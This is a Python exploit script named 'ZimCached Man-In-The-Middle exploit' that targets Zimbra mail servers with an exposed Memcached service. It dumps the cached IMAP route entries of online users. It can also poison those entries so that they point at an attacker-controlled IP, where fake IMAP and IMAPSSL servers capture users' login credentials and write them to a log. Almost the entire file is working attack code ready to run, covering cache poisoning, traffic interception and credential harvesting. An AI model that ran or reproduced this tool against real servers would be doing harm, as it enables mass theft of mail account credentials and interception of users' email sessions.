#!/usr/bin/python3
# -*- coding: utf-8 -*-

from typing import List
from memcached_client import MemcachedClient
from fake_imap_server import FakeIMAPServer
import argparse
import socket
import threading
import time
import sys


def log(file_path: str, text: str = ""):
    """
    This function logs the input text to the log file.
    :param file_path: Log file path.
    :param text: Text
    :return:
    """
    try:
        print(text)
        with open(file_path, "a") as f:
            f.write(f"{text}\r\n")
    except Exception as e:
        print(f"Failed to write data to {file_path}: {e}")


def dump_route_info(log_file: str, target_zimbra: str, memcached_port: int = 11211):
    """
    This function connects to the Memcached service on the target Zimbra server
    and dumps route information of the online users.

    :param log_file: Log file path
    :param target_zimbra: hostname or ip address of the Zimbra server
    :param memcached_port: Memcached port
    :return:
    """

    print("* Dumping route information for the Zimbra users...")

    try:
        memcached_client = MemcachedClient(host=target_zimbra,
                                           port=memcached_port)
        memcached_items = memcached_client.extract_items()
    except Exception as e:
        sys.exit(f"- Failed to connect to the Memcached service: {e}")

    print("Key -> Value")
    for key, value in memcached_items.items():
        log(file_path=log_file, text=f"{key} -> {value}")


def run_mitm_attack(log_file: str,
                    target_zimbra: str,
                    attacker_ip: str,
                    cert_file: str,
                    key_file: str,
                    memcached_port: int = 11211,
                    imap_port: int = 143,
                    imapssl_port: int = 993,
                    specific_users: List[str] = None
                    ):
    """

    :param log_file: File to log stolen credentials.
    :param target_zimbra: Hostname or IP address of the Zimbra mail server
    :param attacker_ip: Attacker IP address, the address to bind the fake IMAP(SSL) server.
    :param cert_file: TLS/SSL certificate file path.
    :param key_file: TLS/SSL certificate file path.
    :param memcached_port: Port of the exposed Memcached service on the target.
    :param imap_port: Port to bind the fake IMAP server.
    :param imapssl_port: Port to bind the fake IMAP(SSL) server.
    :param specific_users: Optional, target a specific group of IMAP(SSL) users.
    :return:
    """

    if specific_users:
        print(f"* Attacking {specific_users} users...")
    else:
        print(f"* Attacking all online IMAP(SSL) users...")

    print("* Connecting to the Memcached service to extract items...")
    try:
        memcached_client = MemcachedClient(host=target_zimbra,
                                           port=memcached_port)
    except Exception as e:
        sys.exit(f"- Failed to connect to the Memcached service: {e}")
    print("+ Connected to the Memcached server.")

    print("* Generating poisoned route items...")

    poisoned_items = {}
    if specific_users:
        # Only poison cached route information for a specific users.
        for user in specific_users:
            poisoned_items[f"route:proto=imap;user={user}"] = f"{attacker_ip}:{imap_port}"
            poisoned_items[f"route:proto=imapssl;user={user}"] = f"{attacker_ip}:{imapssl_port}"
    else:
        # Poison cached route information for all the IMAP(SSL) users.
        memcached_items_dict = memcached_client.extract_items()

        number_of_route_items = len(memcached_items_dict.keys())
        print(f"+ Number of route items: {number_of_route_items}")
        if number_of_route_items == 0:
            print("- No route items found, maybe there is no online user.")
            return

        for key, value in memcached_items_dict.items():
            if key.startswith("route:proto=imap;"):
                poisoned_items[key] = f"{attacker_ip}:{imap_port}"
            elif key.startswith("route:proto=imapssl;"):
                poisoned_items[key] = f"{attacker_ip}:{imapssl_port}"

        

    print(f"* Starting fake IMAP server on port {imap_port}...")
    try:
        imap_server = FakeIMAPServer(log_file=log_file,
                                     bind_port=imap_port,
                                     bind_address=attacker_ip)
        imap_thread = threading.Thread(target=imap_server.run, daemon=True)
        imap_thread.start()
    except Exception as e:
        sys.exit(f"Failed to run IMAP server on {attacker_ip}:{imap_port} : {e}")
    print("+ Fake IMAP server is up!")

    print(f"* Starting fake IMAPSSL server on port {imapssl_port}...")
    try:
        imapssl_server = FakeIMAPServer(log_file=log_file,
                                        bind_port=imapssl_port,
                                        bind_address=attacker_ip,
                                        is_ssl=True,
                                        cert_file=cert_file,
                                        key_file=key_file)
        imapssl_thread = threading.Thread(target=imapssl_server.run, daemon=True)
        imapssl_thread.start()
    except Exception as e:
        sys.exit(f"Failed to run IMAPSSL server on {attacker_ip}:{imapssl_port} : {e}")
    print("+ Fake IMAPSSL server is up!")

    time.sleep(3)

    print("* Injecting poisoned route items to start the Man-In-The-Middle attack...")
    try:
        memcached_client.set_items(poisoned_items)
    except Exception as e:
        print(f"- Failed to inject the items: {e}")

    print("* Press any key to stop the attack after stealing the credentials...")
    input()
    print("+ Done!")

    try:
        """
        Important! After the attack finished, the poisoned keys should be deleted
        to avoid DoS condition.
        """
        memcached_client.delete_keys(list(poisoned_items))
        memcached_client.close()
        print("+ Poisoned keys were deleted.")
    except Exception:
        pass


def main():
    parser = argparse.ArgumentParser(description="ZimCached Man-In-The-Middle exploit",
                                     formatter_class=argparse.RawTextHelpFormatter)

    mode_args = parser.add_argument_group("Mode arguments")
    mode_args.add_argument('--mode', '-m', type=str, required=True,
                           help="""(dump/mitm)\r
    \r
    dump         Dump route information of the online E-mail users.\r
    \r
    mitm         Poison route information stored in the Memcached server,
                 Start IMAP(SSL) server to capture incoming IMAP(SSL) traffic and\r
                 steal user credentials (MITM attack).\r
                 NOTE: It's possible to attack IMAPSSL, POP3SSL and HTTPS protocols\r
                 which are used by Zimbra for communication but this script only supports IMAP(SSL).\n
    \r
    """)

    target_args = parser.add_argument_group("Target Zimbra server arguments")

    target_args.add_argument("--target", "-t", type=str, required=True,
                             help="Hostname or IP address of the target Zimbra mail server")

    target_args.add_argument("--memcached-port", "-mp", type=int, default=11211,
                             help="Port of the exposed Memcached service on the Zimbra server")

    mitm_args = parser.add_argument_group("MITM attack arguments")

    mitm_args.add_argument("--ip", "-i", type=str,
                           help="Attacker IP address")

    mitm_args.add_argument("--port", "-p", type=int, default=143,
                           help="Port to bind the fake IMAP server for insecure IMAP connections [default:143]")

    mitm_args.add_argument("--ssl-port", "-sp", type=int, default=993,
                           help="Port to bind the fake IMAP server for IMAP over TLS/SSL connections [default:993]")

    mitm_args.add_argument("--cert-file", "-cf", type=str,
                           help="TLS/SSL certificate file path")

    mitm_args.add_argument("--key-file", "-kf", type=str,
                           help="TLS/SSL private key file path")

    mitm_args.add_argument("--users", "-u", type=str, nargs="+", default=None,
                           help="List of specific users to target [default: targeting all IMAP(SSL) users]")

    log_args = parser.add_argument_group("Log arguments")
    log_args.add_argument("--log", "-l", type=str, required=True,
                          help="File to log information (dump,mitm modes)")

    args = parser.parse_args()

    args.mode = args.mode.lower()
    if args.mode not in ["dump", "mitm"]:
        parser.error(f"Invalid mode: {args.mode}, valid modes are: dump, mitm")

    if args.mode == "dump":
        # Dump route information.

        if not args.target:
            parser.error("--target/-t argument required.")
        if not args.log:
            parser.error("--log/-l argument required.")

        dump_route_info(log_file=args.log,
                        target_zimbra=args.target,
                        memcached_port=args.memcached_port
                        )

    elif args.mode == "mitm":
        # Run Man-In-The-Middle attack

        if None in [args.ip, args.port, args.ssl_port, args.cert_file, args.key_file]:
            parser.error("--ip/-i, --port/-p, --ssl-port/-sp, --cert-file/-cf, --key-file/-kf arguments are required.")

        run_mitm_attack(log_file=args.log,
                        target_zimbra=args.target,
                        attacker_ip=args.ip,
                        cert_file=args.cert_file,
                        key_file=args.key_file,
                        memcached_port=args.memcached_port,
                        imap_port=args.port,
                        imapssl_port=args.ssl_port,
                        specific_users=args.users
                        )


if __name__ == "__main__":
    main()
